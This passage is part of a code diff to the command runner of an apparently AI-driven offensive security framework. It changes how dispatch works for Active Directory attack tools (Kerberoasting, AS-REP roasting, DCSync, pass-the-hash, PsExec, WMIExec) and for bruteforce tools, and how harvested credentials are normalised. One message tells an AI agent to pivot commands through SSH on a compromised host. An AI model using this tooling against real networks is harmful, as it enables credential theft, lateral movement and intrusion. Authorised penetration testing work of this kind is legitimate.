             results["vuln_assess"] = vuln_assess(target, recon_blob)
         except ImportError:
-            results["vuln_assess"] = "[!] killchain.py not found — skipping vuln assessment"
+            results["vuln_assess"] = "[!] core.killchain package not found — skipping vuln assessment"
         except Exception as exc:
             results["vuln_assess"] = f"[!] vuln_assess error: {exc}"
 
@@ -991,12 +480,27 @@ def run_arbitrary_cmd(cmd_str: str) -> str:
                     f"[!] BLOCKED: {clean_ip} is a private/internal IP. "
                     f"You CANNOT run {parts[0]} against it from outside.\n"
                     f"AI: Route through SSH! Use:\n"
-                    f"  [TOOL: ssh_exec COMPROMISED_HOST USER PASS '{cmd_str}']\n"
-                    f"This will run the command INSIDE the compromised target where internal IPs are reachable."
+                        f"  [TOOL: ssh_exec COMPROMISED_HOST USER PASS '{cmd_str}']\n"
+                        f"This will run the command INSIDE the compromised target where internal IPs are reachable."
                 )
 
     # Smart timeout based on command type
     tool = parts[0].lower()
+
+    # Prefer the decorator registry for internal OCTOPUS tools. Without this,
+    # task-map commands such as killchain_privesc/plugin/ssh_session are treated
+    # as shell binaries and fail with "command not found".
+    try:
+        from core.tools.registry import get_tool
+        two_word = f"{parts[0].lower()} {parts[1].lower()}" if len(parts) >= 2 else ""
+        if get_tool(tool) or (two_word and get_tool(two_word)):
+            return run_tool_by_command(cmd_str)
+    except Exception as _exc:
+        logging.debug(f"Suppressed in runner.py: {_exc}")
+
+    if tool in {"bruteforce", "bruteforce_ssh", "bruteforce_ftp", "web_login_bruteforce"}:
+        return run_tool_by_command(cmd_str)
+
     timeout_map = {
         "telnet":     10,   # Was 300! Telnet should be quick banner grab only
         "ssh":        15,   # SSH connection test
@@ -1131,48 +635,79 @@ def run_arbitrary_cmd(cmd_str: str) -> str:
 # v9.0: AD TOOL HANDLERS
 # ─────────────────────────────────────────────
 
+def _creds_to_dict(creds, service: str = "") -> dict:
+    """Normalize legacy tuple credentials to the dict shape AD modules expect."""
+    if isinstance(creds, dict):
+        user = creds.get("user") or creds.get("username") or ""
+        password = creds.get("password") or creds.get("pwd") or ""
+        return {
+            "user": user,
+            "username": user,
+            "password": password,
+            "domain": creds.get("domain", ""),
+            "nthash": creds.get("nthash", ""),
+            "service": creds.get("service", service),
+            "port": creds.get("port", 22 if service == "ssh" else 0),
+        }
+    if isinstance(creds, (tuple, list)) and len(creds) >= 2:
+        user, password = creds[0], creds[1]
+        if user and password:
+            return {
+                "user": user,
+                "username": user,
+                "password": password,
+                "domain": "",
+                "nthash": "",
+                "service": service,
+                "port": 22 if service == "ssh" else 0,
+            }
+    return {"user": "", "username": "", "password": "", "domain": "", "nthash": "", "service": service, "port": 0}
+
+
 def _run_ad_tool(action: str, target: str) -> str:
     """Dispatch Active Directory attack tools."""
     import logging
     logger = logging.getLogger("octopus.runner.ad")
 
     try:
-        creds = get_best_creds_for_target(target, "ldap") or get_best_creds_for_target(target, "ssh") or {}
-        user = creds.get("username", "")
+        creds = _creds_to_dict(get_best_creds_for_target(target, "ldap"), "ldap")
+        if not creds["user"]:
+            creds = _creds_to_dict(get_best_creds_for_target(target, "ssh"), "ssh")
+        user = creds.get("user", "")
         password = creds.get("password", "")
 
         if action == "enum":
             from core.killchain.ad.enumeration import run_ad_enum
-            return run_ad_enum(target, creds={"username": user, "password": password} if user else None)
+            return run_ad_enum(target, creds=creds if user else None)
         elif action == "asrep":
             from core.killchain.ad.kerberos import asrep_roast
-            return asrep_roast(target)
+            return asrep_roast(target, creds=creds if user else None)
         elif action == "kerberoast":
             from core.killchain.ad.kerberos import kerberoast
             if not user:
                 return "[!] Kerberoasting requires valid domain credentials. Run bruteforce or find creds first."
-            return kerberoast(target, {"username": user, "password": password})
+            return kerberoast(target, creds)
         elif action == "dcsync":
             from core.killchain.ad.credential import dcsync
             if not user:
                 return "[!] DCSync requires domain admin credentials."
-            return dcsync(target, {"username": user, "password": password})
+            return dcsync(target, creds)
         elif action == "pth":
             from core.killchain.ad.credential import pass_the_hash
             nthash = input(f"\033[36m  NT Hash: \033[0m").strip()
             if not nthash:
                 return "[!] Pass-the-Hash requires an NT hash."
-            return pass_the_hash(target, user or "Administrator", nthash)
+            return pass_the_hash(target, user or "Administrator", nthash, domain=creds.get("domain", ""))
         elif action == "psexec":
             from core.killchain.ad.lateral import psexec
             if not user:
                 return "[!] PsExec requires valid credentials."
-            return psexec(target, {"username": user, "password": password})
+            return psexec(target, creds)
         elif action == "wmiexec":
             from core.killchain.ad.lateral import wmiexec
             if not user:
                 return "[!] WMIExec requires valid credentials."
-            return wmiexec(target, {"username": user, "password": password})
+            return wmiexec(target, creds)
         else:
             return f"[!] Unknown AD action: {action}"
     except ImportError as e:
@@ -1192,8 +727,8 @@ def _run_pivot_tool(action: str, target: str) -> str:
     logger = logging.getLogger("octopus.runner.pivot")
 
     try:
-        creds = get_best_creds_for_target(target, "ssh") or {}
-        user = creds.get("username", "")
+        creds = _creds_to_dict(get_best_creds_for_target(target, "ssh"), "ssh")
+        user = creds.get("user", "")
         password = creds.get("password", "")
 
         if not user:
